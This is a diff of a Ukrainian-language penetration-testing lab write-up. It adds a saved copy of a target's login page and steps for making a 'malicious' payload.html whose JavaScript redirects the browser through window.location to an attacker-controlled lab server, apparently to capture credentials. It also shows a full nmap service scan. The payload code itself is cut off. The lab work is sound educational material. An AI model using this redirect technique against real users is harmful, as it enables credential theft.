@@ -51,7 +51,49 @@ sudo nmap -v -sV -sC -p- 10.0.2.7
 - для того щоб використати цю вразливість, потрібно зберегти локально сторінку входу (html-код)
 <img src="media/image9.png" />
 
-- наступним кроком, потрібно зробити &quot;шкідливу&quot; вебсторінку payload.html і вкласти туди наступний JavaScript-код
+```html
+ 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Login</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <style>
+        body{ font: 14px sans-serif; }
+        .wrapper{ width: 360px; padding: 20px; }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <h2>Login</h2>
+        <p>Please fill in your credentials to login.</p>
+
+        
+        <form action="/index.php" method="post">
+            <div class="form-group">
+                <label>Username</label>
+                <input type="text" name="username" class="form-control " value="">
+                <span class="invalid-feedback"></span>
+            </div>    
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" name="password" class="form-control ">
+                <span class="invalid-feedback"></span>
+            </div>
+            <div class="form-group">
+                <input type="submit" class="btn btn-primary" value="Login">
+            </div>
+            <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
+        </form>
+    </div>
+</body>
+</html>
+
+````
+
+- наступним кроком, потрібно зробити &quot;шкідливу&quot; вебсторінку **payload.html** і вкласти туди наступний JavaScript-код
+- в JS-коді робимо перенаправлення на &quot;наш&quot; сервер (цільова ІР-адреса 10.0.2.4) шляхом заміни значень в браузерному об&apos;єкті window.location, який відповідає за рядок де вказується адреса http-запиту
 
 ```html
 <!DOCTYPE html>
